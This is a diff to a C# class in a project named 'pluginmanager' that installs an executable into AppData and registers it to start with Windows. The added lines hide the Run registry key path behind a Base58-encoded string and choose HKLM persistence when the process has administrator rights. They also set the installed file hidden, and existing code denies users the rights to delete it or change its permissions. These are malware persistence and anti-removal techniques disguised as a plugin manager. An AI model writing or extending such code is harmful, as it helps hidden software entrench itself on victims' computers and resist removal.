@@ -1,5 +1,7 @@
 ﻿using System;
 using System.Security.AccessControl;
+using System.Security.Principal;
+using System.Text;
 using System.Threading.Tasks;
 using Microsoft.Win32;
 
@@ -12,6 +14,7 @@ namespace pluginmanager.Lifetime
         private string installPath = System.IO.Path.Combine(System.Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), config.ExecName);
         public Register()
         {
+            Logger.Log(this.ToString(), "started");
             new Task(() => { Install(); }).Start();
         }
         public void denyreg(RegistryKey key)
@@ -32,10 +35,19 @@ namespace pluginmanager.Lifetime
 
             }
         }
+        public static bool IsAdministrator()
+        {
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
+            {
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                return principal.IsInRole(WindowsBuiltInRole.Administrator);
+            }
+        }
         public void denyfile()
         {
             try
             {
+                System.IO.File.SetAttributes(installPath, System.IO.FileAttributes.Hidden);
                 FileSecurity rs = System.IO.File.GetAccessControl(installPath);
                 rs.AddAccessRule(new FileSystemAccessRule(user, FileSystemRights.ChangePermissions | FileSystemRights.Delete,
             InheritanceFlags.None,
@@ -51,7 +63,7 @@ namespace pluginmanager.Lifetime
         }
         public static bool IsStartup()
         {
-            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false))
+            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Encoding.UTF8.GetString(SimpleBase.Base58.Bitcoin.Decode("34ZJ43hwDSVTMSG8RJBYjgMYrHKfQtgMaT2pAjeRuju84nCxR5WcXtgiVGFczy")), false))
             {
                 var found = key?.GetValue(config.Description);
                 return found != null;
@@ -70,10 +82,25 @@ namespace pluginmanager.Lifetime
                 {
                     try
                     {
-                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                        if (!IsAdministrator())
                         {
-                            key.SetValue(config.Description, installPath);
-                            denyreg(key);
+                            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(Encoding.UTF8.GetString(SimpleBase.Base58.Bitcoin.Decode("34ZJ43hwDSVTMSG8RJBYjgMYrHKfQtgMaT2pAjeRuju84nCxR5WcXtgiVGFczy")), true))
+                            {
+                                key.SetValue(config.Description, installPath);
+                                denyreg(key);
+                                Logger.Log(this.ToString(), "No admin, so using currentuser as startup");
+
+                            }
+                        }
+                        else
+                        {
+                            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(Encoding.UTF8.GetString(SimpleBase.Base58.Bitcoin.Decode("34ZJ43hwDSVTMSG8RJBYjgMYrHKfQtgMaT2pAjeRuju84nCxR5WcXtgiVGFczy")), true))
+                            {
+                                key.SetValue(config.Description, installPath);
+                                denyreg(key);
+                                Logger.Log(this.ToString(), "im admin, localmachine startup");
+
+                            }
                         }
                     }
                     catch (Exception e)
